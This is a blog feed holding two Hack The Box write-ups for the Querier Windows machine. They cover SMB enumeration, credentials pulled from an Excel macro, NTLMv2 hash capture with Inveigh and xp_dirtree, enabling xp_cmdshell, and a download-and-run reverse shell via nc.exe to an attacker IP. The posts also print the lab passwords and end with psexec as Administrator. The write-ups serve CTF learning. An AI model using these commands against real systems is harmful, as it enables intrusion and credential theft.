<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2019-06-22T16:21:01+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">0xRick Owned Root !</title><subtitle>Infosec Blog , CTF and Hack The Box write-ups , articles and other stuff</subtitle><entry><title type="html">Hack The Box - Querier (Commando)</title><link href="http://localhost:4000/hack-the-box/querier-2/" rel="alternate" type="text/html" title="Hack The Box - Querier (Commando)" /><published>2019-06-22T00:00:00+02:00</published><updated>2019-06-22T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/querier-2</id><content type="html" xml:base="http://localhost:4000/hack-the-box/querier-2/">&lt;hr /&gt;

&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
&lt;h4 id=&quot;hey-guys-this-is-the-second-post-for-querier-you-can-read-the-first-post-here-in-the-first-post-i-solved-it-with-kali-in-this-post-i-will-solve-it-with-commando-vm-queriers-ip-is-101010125-i-added-it-to-cwindowssystem32driversetchosts-as-querierhtb-lets-jump-right-in-&quot;&gt;Hey guys this is the second post for Querier, you can read the first post &lt;a href=&quot;/hack-the-box/querier&quot;&gt;here&lt;/a&gt;. In the first post I solved it with kali, In this post I will solve it with commando vm. Querier’s ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.125&lt;/code&gt; I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\Windows\System32\drivers\etc\hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;querier.htb&lt;/code&gt;. Let’s jump right in !&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
&lt;h4 id=&quot;as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-&quot;&gt;As always we will start with &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; to scan for open ports and services :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC querier.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/querier-2/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-got-smb-and-mssql-server-on-port-1433-we-dont-have-credentials-for-mssql-so-lets-check-smb&quot;&gt;We got &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;mssql&lt;/code&gt; server on port 1433. We don’t have credentials for &lt;code class=&quot;highlighter-rouge&quot;&gt;mssql&lt;/code&gt; so let’s check &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt;.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;smb&quot;&gt;Smb&lt;/h3&gt;
&lt;h4 id=&quot;we-need-to-list-the-shares-we-can-do-that-using-net-view-&quot;&gt;We need to list the shares, We can do that using &lt;code class=&quot;highlighter-rouge&quot;&gt;net view&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;net view querier.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/querier-2/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-only-showed-us-reports-because-its-the-only-share-that-we-can-access-anonymously-which-is-nice&quot;&gt;It only showed us &lt;code class=&quot;highlighter-rouge&quot;&gt;Reports&lt;/code&gt; because it’s the only share that we can access anonymously which is nice.&lt;/h4&gt;
&lt;h4 id=&quot;we-can-mount-the-share-from-cmd-with-net-use-&quot;&gt;We can mount the share from &lt;code class=&quot;highlighter-rouge&quot;&gt;cmd&lt;/code&gt; with &lt;code class=&quot;highlighter-rouge&quot;&gt;net use&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;net use Z: \\querier.htb\Reports /persistent:yes&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/querier-2/3.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/querier-2/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-can-also-do-it-from-the-file-explorer-&quot;&gt;We can also do it from the file explorer :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/5.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/querier-2/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;mssql&quot;&gt;MSSQL&lt;/h3&gt;
&lt;h4 id=&quot;i-used-olevba-to-get-credentials-from-the-excel-file-like-i-did-in-the-first-post-&quot;&gt;I used &lt;code class=&quot;highlighter-rouge&quot;&gt;olevba&lt;/code&gt; to get credentials from the excel file like I did in the &lt;a href=&quot;/hack-the-box/querier/&quot;&gt;first post&lt;/a&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;to-connect-to-the-mssql-server-i-will-use-heidisql-&quot;&gt;To connect to the &lt;code class=&quot;highlighter-rouge&quot;&gt;mssql&lt;/code&gt; server I will use &lt;a href=&quot;https://www.heidisql.com/&quot;&gt;HeidiSQL&lt;/a&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;however-authentication-failed-&quot;&gt;However, authentication failed :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-tried-windows-authentication-&quot;&gt;I tried windows authentication :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;but-it-also-failed-because-it-was-trying-as-guest-not-reporting-&quot;&gt;But it also failed because it was trying as guest not reporting :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;to-solve-this-we-can-use-runas-to-run-heidi-as-reporting-&quot;&gt;To solve this we can use &lt;code class=&quot;highlighter-rouge&quot;&gt;runas&lt;/code&gt; to run &lt;code class=&quot;highlighter-rouge&quot;&gt;heidi&lt;/code&gt; as reporting :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;runas /netonly /user:QUERIER\reporting cmd.exe&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/querier-2/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;from-the-new-cmd-session-i-ran-heidi-&quot;&gt;From the new &lt;code class=&quot;highlighter-rouge&quot;&gt;cmd&lt;/code&gt; session I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;heidi&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;now-windows-authentication-worked-&quot;&gt;Now windows authentication worked :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;got-permission-denied-for-xp_cmdshell-&quot;&gt;Got permission denied for &lt;code class=&quot;highlighter-rouge&quot;&gt;xp_cmdshell&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-can-run-a-fake-smb-server-to-capture-credentials-using-a-tool-called-inveigh-which-works-like-responder-from-powershell-i-imported-inveigh-import-module-ctoolsinveighinveighps1-then-i-disabled-the-firewall-netsh-advfirewall-set-allprofiles-state-off-and-invoked-inveigh-invoke-inveigh--ip-1010xxxx--consoleoutput-y&quot;&gt;We can run a fake &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt; server to capture credentials using a tool called &lt;code class=&quot;highlighter-rouge&quot;&gt;Inveigh&lt;/code&gt; which works like responder. From &lt;code class=&quot;highlighter-rouge&quot;&gt;powershell&lt;/code&gt; I imported &lt;code class=&quot;highlighter-rouge&quot;&gt;Inveigh&lt;/code&gt; (&lt;code class=&quot;highlighter-rouge&quot;&gt;Import-Module C:\Tools\Inveigh\Inveigh.ps1&lt;/code&gt;). Then I disabled the firewall (&lt;code class=&quot;highlighter-rouge&quot;&gt;netsh advfirewall set allprofiles state off&lt;/code&gt;) and invoked &lt;code class=&quot;highlighter-rouge&quot;&gt;Inveigh&lt;/code&gt; (&lt;code class=&quot;highlighter-rouge&quot;&gt;Invoke-Inveigh -IP 10.10.xx.xx -ConsoleOutput Y&lt;/code&gt;).&lt;/h4&gt;
&lt;h4 id=&quot;from-heidi-i-used-xp_dirtree-&quot;&gt;From &lt;code class=&quot;highlighter-rouge&quot;&gt;Heidi&lt;/code&gt; I used &lt;code class=&quot;highlighter-rouge&quot;&gt;xp_dirtree&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;EXEC MASTER.sys.xp_dirtree '\\10.10.xx.xx\fakeshare'&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/querier-2/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;inveigh-captured-the-ntlmv2-hash-for-mssql-svc-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Inveigh&lt;/code&gt; captured the &lt;code class=&quot;highlighter-rouge&quot;&gt;NTLMv2&lt;/code&gt; hash for &lt;code class=&quot;highlighter-rouge&quot;&gt;mssql-svc&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;after-cracking-the-hash-on-another-box-the-password-is-corporate568-now-we-can-use-runas-to-run-heidi-as-mssql-svc-&quot;&gt;After cracking the hash on another box the password is &lt;code class=&quot;highlighter-rouge&quot;&gt;corporate568&lt;/code&gt;. Now we can use &lt;code class=&quot;highlighter-rouge&quot;&gt;runas&lt;/code&gt; to run &lt;code class=&quot;highlighter-rouge&quot;&gt;Heidi&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;mssql-svc&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;runas /netonly /user:QUERIER\mssql-svc &quot;C:\Program Files\HeidiSQL\heidisql.exe&quot;&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/querier-2/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;queries-to-enable-xp_cmdshell-&quot;&gt;Queries to enable &lt;code class=&quot;highlighter-rouge&quot;&gt;xp_cmdshell&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/19.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/querier-2/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;great-we-got-rce-i-ran-a-python-server-to-host-ncexe-then-i-downloaded-it-on-the-box-and-got-a-reverse-shell-&quot;&gt;Great, we got &lt;code class=&quot;highlighter-rouge&quot;&gt;RCE&lt;/code&gt;. I ran a python server to host &lt;code class=&quot;highlighter-rouge&quot;&gt;nc.exe&lt;/code&gt; then I downloaded it on the box and got a reverse shell :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;EXEC xp_cmdshell 'powershell Invoke-WebRequest -o C:\Users\mssql-svc\Desktop\nc.exe http://10.10.xx.xx/nc.exe';
EXEC xp_cmdshell 'C:\Users\mssql-svc\Desktop\nc.exe -e cmd.exe 10.10.xx.xx 1337'
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/21.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/querier-2/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-owned-user&quot;&gt;We owned user.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;gpp-privilege-escalation-root-flag&quot;&gt;GPP, Privilege Escalation, Root Flag&lt;/h3&gt;
&lt;h4 id=&quot;as-i-said-in-the-first-post-when-i-checked-group-policy-passwords-i-found-administrators-password-there-are-privilege-escalation-enumeration-scripts-for-windows-like-linenumsh-for-linux-one-of-them-is-powerupps1-and-it-checks-for-group-policy-passwords-lets-check-that-one-&quot;&gt;As I said in the &lt;a href=&quot;/hack-the-box/querier/&quot;&gt;first post&lt;/a&gt;, when I checked group policy passwords I found Administrator’s password. There are privilege escalation enumeration scripts for Windows like &lt;code class=&quot;highlighter-rouge&quot;&gt;LinEnum.sh&lt;/code&gt; for Linux one of them is &lt;a href=&quot;https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;powerup.ps1&lt;/code&gt;&lt;/a&gt; and it checks for group policy passwords. Let’s check that one :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier-2/23.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/querier-2/24.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/querier-2/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-also-decrypts-the-password-which-is-nice-password--myunclesaremarioandluigi1&quot;&gt;It also decrypts the password which is nice. Password : &lt;code class=&quot;highlighter-rouge&quot;&gt;MyUnclesAreMarioAndLuigi!!1!&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;now-we-can-use-psexec-to-get-a-shell-as-administrator-i-used-runas-to-start-cmd-as-querieradministrator-then-i-used-psexec-&quot;&gt;Now we can use &lt;code class=&quot;highlighter-rouge&quot;&gt;psexec&lt;/code&gt; to get a shell as Administrator. I used &lt;code class=&quot;highlighter-rouge&quot;&gt;runas&lt;/code&gt; to start &lt;code class=&quot;highlighter-rouge&quot;&gt;cmd&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;QUERIER\Administrator&lt;/code&gt; then I used &lt;code class=&quot;highlighter-rouge&quot;&gt;psexec&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;runas /netonly /user:QUERIER\Administrator cmd.exe&lt;/code&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;psexec \\querier.htb cmd&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/querier-2/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-owned-root-&quot;&gt;And we owned root !&lt;/h4&gt;
&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;first-write-up--hack-the-box---querier&quot;&gt;First write-up : &lt;a href=&quot;/hack-the-box/querier&quot;&gt;Hack The Box - Querier&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---flujab&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/flujab/&quot;&gt;Hack The Box - Flujab&lt;/a&gt;&lt;/h4&gt;
&lt;hr /&gt;</content><author><name></name></author><category term="Windows" /><category term="RCE" /><category term="smb" /><summary type="html">Quick Summary Hey guys this is the second post for Querier, you can read the first post here. In the first post I solved it with kali, In this post I will solve it with commando vm. Querier’s ip is 10.10.10.125 I added it to C:\Windows\System32\drivers\etc\hosts as querier.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC querier.htb We got smb and mssql server on port 1433. We don’t have credentials for mssql so let’s check smb. Smb We need to list the shares, We can do that using net view : net view querier.htb It only showed us Reports because it’s the only share that we can access anonymously which is nice. We can mount the share from cmd with net use : net use Z: \\querier.htb\Reports /persistent:yes We can also do it from the file explorer : MSSQL I used olevba to get credentials from the excel file like I did in the first post : To connect to the mssql server I will use HeidiSQL : However, authentication failed : I tried windows authentication : But it also failed because it was trying as guest not reporting : To solve this we can use runas to run heidi as reporting : runas /netonly /user:QUERIER\reporting cmd.exe From the new cmd session I ran heidi : Now windows authentication worked : Got permission denied for xp_cmdshell : We can run a fake smb server to capture credentials using a tool called Inveigh which works like responder. From powershell I imported Inveigh (Import-Module C:\Tools\Inveigh\Inveigh.ps1). Then I disabled the firewall (netsh advfirewall set allprofiles state off) and invoked Inveigh (Invoke-Inveigh -IP 10.10.xx.xx -ConsoleOutput Y). From Heidi I used xp_dirtree : EXEC MASTER.sys.xp_dirtree '\\10.10.xx.xx\fakeshare' Inveigh captured the NTLMv2 hash for mssql-svc : After cracking the hash on another box the password is corporate568. Now we can use runas to run Heidi as mssql-svc : runas /netonly /user:QUERIER\mssql-svc &quot;C:\Program Files\HeidiSQL\heidisql.exe&quot; Queries to enable xp_cmdshell : EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; Great, we got RCE. I ran a python server to host nc.exe then I downloaded it on the box and got a reverse shell : EXEC xp_cmdshell 'powershell Invoke-WebRequest -o C:\Users\mssql-svc\Desktop\nc.exe http://10.10.xx.xx/nc.exe'; EXEC xp_cmdshell 'C:\Users\mssql-svc\Desktop\nc.exe -e cmd.exe 10.10.xx.xx 1337' We owned user. GPP, Privilege Escalation, Root Flag As I said in the first post, when I checked group policy passwords I found Administrator’s password. There are privilege escalation enumeration scripts for Windows like LinEnum.sh for Linux one of them is powerup.ps1 and it checks for group policy passwords. Let’s check that one : It also decrypts the password which is nice. Password : MyUnclesAreMarioAndLuigi!!1! Now we can use psexec to get a shell as Administrator. I used runas to start cmd as QUERIER\Administrator then I used psexec : runas /netonly /user:QUERIER\Administrator cmd.exe psexec \\querier.htb cmd And we owned root ! That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. First write-up : Hack The Box - Querier Previous Hack The Box write-up : Hack The Box - Flujab</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/querier-2/0.png" /></entry><entry><title type="html">Hack The Box - Querier</title><link href="http://localhost:4000/hack-the-box/querier/" rel="alternate" type="text/html" title="Hack The Box - Querier" /><published>2019-06-22T00:00:00+02:00</published><updated>2019-06-22T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/querier</id><content type="html" xml:base="http://localhost:4000/hack-the-box/querier/">&lt;hr /&gt;

&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
&lt;h4 id=&quot;hey-guys-today-querier-retired-and-heres-my-write-up-about-it-it-was-a-great-windows-machine-covering-some-interesting-stuff-and-i-enjoyed-iti-wrote-two-posts-for-this-machine-first-one-solving-it-with-kali-and-the-other-one-solving-it-with-commando-vm-you-can-find-the-second-post-here-its-a-windows-box-and-its-ip-is-101010125-i-added-it-to-etchosts-as-querierhtb-lets-jump-right-in&quot;&gt;Hey guys today Querier retired and here’s my write-up about it. It was a great windows machine covering some interesting stuff and I enjoyed it.I wrote two posts for this machine, first one solving it with kali and the other one solving it with commando vm, you can find the second post &lt;a href=&quot;/hack-the-box/querier-2/&quot;&gt;here&lt;/a&gt;. It’s a Windows box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.125&lt;/code&gt;, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;querier.htb&lt;/code&gt;. Let’s jump right in!&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
&lt;h4 id=&quot;as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-&quot;&gt;As always we will start with &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; to scan for open ports and services :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC querier.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/querier/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-got-smb-and-mssql-server-on-port-1433-lets-check-smb&quot;&gt;We got &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;mssql&lt;/code&gt; server on port 1433. Let’s check &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt;.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;smb&quot;&gt;Smb&lt;/h3&gt;
&lt;h4 id=&quot;we-need-to-list-the-shares-first-i-used-smbclient-&quot;&gt;We need to list the shares first. I used &lt;code class=&quot;highlighter-rouge&quot;&gt;smbclient&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbclient --list //querier.htb/ -U &quot;&quot;
Enter WORKGROUP\'s password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Reports         Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to querier.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Failed to connect with SMB1 -- no workgroup available
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;obviously-if-theres-an-anonymously-accessible-share-it-will-be-reports-lets-see-whats-in-there-&quot;&gt;Obviously if there’s an anonymously accessible share it will be &lt;code class=&quot;highlighter-rouge&quot;&gt;Reports&lt;/code&gt;, Let’s see what’s in there :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/querier# smbclient //querier.htb/Reports/ -U &quot;&quot;
Enter WORKGROUP\'s password: 
Try &quot;help&quot; to get a list of possible commands.
smb: \&amp;gt; ls
  .                                   D        0  Mon Jan 28 18:23:48 2019
  ..                                  D        0  Mon Jan 28 18:23:48 2019
  Currency Volume Report.xlsm         A    12229  Sun Jan 27 17:21:34 2019

                6469119 blocks of size 4096. 1608855 blocks available
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;only-an-excel-file&quot;&gt;Only an Excel file.&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smb: \&amp;gt; get &quot;Currency Volume Report.xlsm&quot;
getting file \Currency Volume Report.xlsm of size 12229 as Currency Volume Report.xlsm (17.1 KiloBytes/sec) (average 17.1 KiloBytes/sec)
smb: \&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/querier# file Currency\ Volume\ Report.xlsm 
Currency Volume Report.xlsm: Microsoft Excel 2007+
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;mssql-credentials-from-reportxlsm&quot;&gt;MSSQL Credentials from Report.xlsm&lt;/h3&gt;
&lt;h4 id=&quot;i-checked-the-contents-of-the-excel-file-by-just-viewing-it-as-it-will-be-opened-with-the-archive-manager-&quot;&gt;I checked the contents of the excel file by just viewing it as it will be opened with the archive manager :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;in-xl-i-found-vbaprojectbin-so-i-used-olevba-from-oletools-to-see-if-i-can-get-anything-&quot;&gt;in &lt;code class=&quot;highlighter-rouge&quot;&gt;xl&lt;/code&gt; I found &lt;code class=&quot;highlighter-rouge&quot;&gt;vbaProject.bin&lt;/code&gt; so I used &lt;code class=&quot;highlighter-rouge&quot;&gt;olevba&lt;/code&gt; from &lt;a href=&quot;https://www.decalage.info/python/oletools&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;oletools&lt;/code&gt;&lt;/a&gt; to see if I can get anything :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/querier# olevba Currency\ Volume\ Report.xlsm 
olevba 0.54.2 on Python 2.7.16 - http://decalage.info/python/oletools
===============================================================================
FILE: Currency Volume Report.xlsm
Type: OpenXML
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: xl/vbaProject.bin - OLE stream: u'VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

' macro to pull data for client volume reports
'
' further testing required

Private Sub Connect()

Dim conn As ADODB.Connection
Dim rs As ADODB.Recordset

Set conn = New ADODB.Connection
conn.ConnectionString = &quot;Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6&quot;
conn.ConnectionTimeout = 10
conn.Open

If conn.State = adStateOpen Then

  ' MsgBox &quot;connection successful&quot;
 
  'Set rs = conn.Execute(&quot;SELECT * @@version;&quot;)
  Set rs = conn.Execute(&quot;SELECT * FROM volume;&quot;)
  Sheets(1).Range(&quot;A1&quot;).CopyFromRecordset rs
  rs.Close

End If

End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: xl/vbaProject.bin - OLE stream: u'VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Open                |May open a file                              |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
